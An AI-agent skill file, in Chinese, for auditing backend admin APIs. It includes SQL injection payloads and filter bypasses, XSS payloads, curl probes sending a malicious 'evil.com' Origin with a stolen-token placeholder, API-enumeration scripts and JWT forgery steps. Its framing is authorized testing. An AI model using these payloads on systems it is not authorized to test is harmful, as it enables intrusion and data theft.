---
name: backend-security-audit
title: 后端系统安全审计
description: 审计后台管理系统 API 安全性，包括 SQL 注入、XSS、CORS、认证绕过、逻辑漏洞等。
trigger: 用户要求测试后台管理系统的安全性、防御 XSS/SQL 注入/CSRF/CORS 等，或提供 API 接口让我攻击/渗透。
---

# 后端系统安全审计

## 触发条件

- 用户提到“后台管理系统”安全、XSS、SQL 注入、CSRF、CORS
- 用户给出接口地址让我尝试攻击/破解/渗透
- 用户想验证自己做的防御是否有效
- 用户要求“扮演黑客”测试系统

## 审计原则

1. **绝不直接攻击生产环境**：先确认域名归属、测试环境、是否允许攻击
2. **从登录接口开始，但重点不在登录接口**：登录接口通常防御最好，真实风险在数据查询/展示/上传接口
3. **用真实 payload 验证**，不只给建议
4. **区分“测试环境”和“线上环境”**，对用户明确要求测试环境才放行
5. **保留证据**：输出状态码、响应时间、响应长度、关键响应头

## 测试流程

### 第一阶段：信息收集

- 探测接口路径和允许的 HTTP 方法
- 读取响应头：`Server`、`Content-Type`、`Access-Control-*`、`X-Content-Type-Options`
- 识别框架：go-zero 错误特征、`Traceparent` 头、nginx 版本
- 探测 OPTIONS 预检请求，**更要测试真实 POST/GET 请求的 CORS 响应**（OPTIONS 可能反射而真实请求不反射）
- 下载前端 JS 源码，分析 `localStorage`/`sessionStorage` 中的 Token 存储方式、API 基地址、完整接口路由
- 基于前端路由和已知路径结构枚举后端 API 路径（不依赖前端 fallback）
- 子域名资产扫描，寻找其他入口（移动端、管理后台、对象存储、调试域名等）

### 第二阶段：SQL 注入测试

测试点：所有字符串输入参数、URL 参数、Cookie、Header

基础 payload：

```
' OR '1'='1
" OR "1"="1" --
admin' --
admin' OR '1'='1' LIMIT 1 --
1' UNION SELECT 1,2,3 --
admin' AND SLEEP(5) --
admin' AND BENCHMARK(1000000,MD5('a')) --
admin' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --
```

高级绕过：

```
admin' /*!50000AND*/ 1=1 --
admin' AND 0x61646d696e='admin' --
admin' AND CHAR(97,100,109,105,110)='admin' --
admin' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --
admin'%0bOR%0b'1'='1
admin'/**/OR/**/'1'='1
```

### 第三阶段：XSS 测试

测试点：所有会被展示到前端的数据字段、URL 参数、错误信息

```html
<script>alert('xss')</script>
<img src=x onerror=alert('xss')>
<svg onload=alert('xss')>
"><script>alert(1)</script>
javascript:alert(1)
```

### 第四阶段：CORS 配置检查

**关键：不要只测 OPTIONS，真实 POST/GET 的 CORS 头才是攻击面。**

```bash
# 1. 预检请求（可能反射，但只是第一道门）
curl -i -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  https://target.com/api/.../login

# 2. 真实 POST 请求（关键判断）
curl -i -X POST \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"userName":"test","password":"test"}' \
  https://target.com/api/.../login

# 3. 登录后接口（如 user/info）用恶意 Origin 测试，看是否允许跨域读取数据
curl -i -X GET \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer <stolen_token>" \
  https://target.com/api/.../user/info
```

**危险标志**：
- 真实 POST/GET 请求中 `Access-Control-Allow-Origin` 反射任意 Origin
- `Access-Control-Allow-Credentials: true` 且 Origin 不是固定白名单
- `Access-Control-Allow-Methods` 包含危险方法（PUT/DELETE/PATCH）+ 反射 Origin
- 登录后接口对任意 Origin 返回数据，允许攻击者窃取 Token 后的数据

### 第五阶段：前端源码与接口枚举

下载前端打包后的 JS/CSS，提取信息：

```python
import requests, re

js_url = "https://admin.target.com/umi.xxxxx.js"
js = requests.get(js_url, timeout=30).text

# 提取 /api/ 路径
api_paths = re.findall(r'"/api/[a-zA-Z0-9/_-]+"', js)
print(set(api_paths))

# 搜索 Token 存储方式
for kw in ["localStorage", "sessionStorage", "Authorization", "Bearer", "token"]:
    if kw in js:
        print(f"发现 {kw}")
        # 输出上下文
        idx = js.find(kw)
        print(js[idx-80:idx+120])
```

重点分析：
- `baseURL` 和完整 API 基地址
- `localStorage.getItem("token")` 等 Token 存储位置
- `Authorization: Bearer` 或 `AccessToken`/`Token` 等认证头
- 前端路由列表（反推后端 API 路径）
- 是否加载 vConsole、eruda 等调试工具（生产环境应移除）

接口枚举要直接请求后端 API，不要依赖前端 SPA 的 200 fallback：

```python
import requests

candidates = [
    "/api/sys/user/list",
    "/api/sys/user/info",
    "/api/sys/user/page",
    "/api/sys/role/list",
    "/api/sys/menu/list",
    "/api/sys/dept/list",
    "/api/sys/dict/list",
    "/api/sys/config/list",
    "/api/sys/upload",
    "/api/sys/log/list",
]

for path in candidates:
    r = requests.get("https://adminapi.target.com" + path, timeout=8)
    if r.status_code != 404:
        print(f"[{r.status_code}] {path}")
```

### 第六阶段：JWT 与认证绕过

- 测试 JWT `none` 算法：`jwt.encode(payload, "", algorithm="none")`
- 弱密钥爆破（常用密钥字典）
- 尝试空 Token、过期 Token、伪造 Token
- 检查接口是否对未认证请求返回 401（存在但未授权）还是 404（不存在）

### 第七阶段：认证与逻辑漏洞

- 用户名枚举（时间侧信道）
- 登录失败限速
- 并发 race condition
- 空密码/空账号/特殊字符账号
- Cookie 注入、Header 注入
- 方法覆盖（X-HTTP-Method-Override）

### 第六阶段：接口枚举

基于已知路径结构猜测：

```
/api/sys/user/list
/api/sys/user/info
/api/sys/user/detail
/api/sys/user/page
/api/sys/user/search
/api/sys/role/list
/api/sys/menu/list
/api/sys/dept/list
/api/sys/dict/list
/api/sys/log/list
```

## 常见框架指纹

### go-zero
- 错误：`field "xxx" is not set`
- 错误：`type mismatch for field "xxx"`
- 错误：`string: ..., error: invalid character ...`
- 响应头常有 `Traceparent`
- 字段严格绑定，类型校验强

### gin/echo
- 错误信息可能更灵活，容易出现自定义结构

## 危险信号清单

| 信号 | 危险级别 | 说明 |
|------|---------|------|
| SQL 报错回显 | 高 | 泄露数据库结构 |
| 登录时间差异大 | 中 | 可能用户名枚举 |
| CORS 反射 Origin + Credentials（真实请求） | 高 | 跨域窃取用户数据 |
| 业务接口未认证返回数据 | 高 | 直接数据泄露 |
| Token 存在 localStorage | 中 | 易被 XSS 窃取 |
| 生产环境加载 vConsole/eruda | 中 | 调试信息泄露 |
| 前端 JS 暴露完整接口路由 | 中 | 降低攻击者枚举成本 |
| nginx 版本号暴露 | 低 | 降低攻击者信息收集成本 |
| 登录失败无限制 | 中 | 可被暴力破解 |
| 响应头无 CSP | 中 | XSS 风险增加 |

## 输出格式

每次审计输出：
1. 测试范围（接口、方法、域名）
2. 发现了什么（状态码、响应时间、响应头）
3. 危险等级评估
4. 修复建议（代码示例）
5. 下一步建议

## 常见 Pitfall

- **不要只测登录接口**：登录接口通常是最安全的，真实漏洞在业务查询接口
- **不要忽略 CORS**：即使 SQL 注入防住，CORS 配置错误也能导致数据泄露
- **不要只看 200 状态码**：401/403 说明接口存在且需要认证，这正是攻击目标
- **注意响应头**：`Access-Control-Allow-Origin` 和 `Access-Control-Allow-Credentials` 是重点
- **记录时间侧信道**：同一用户存在/不存在时响应时间差异可能泄露信息

## 参考文件

- `references/security-audit-probes.md` — 可复用的测试脚本和 payload 集合
- `references/api-enum-and-cors-poc.md` — 前端 JS 反编译、API 枚举、CORS 跨域窃取 Token 的完整攻击链与修复方案
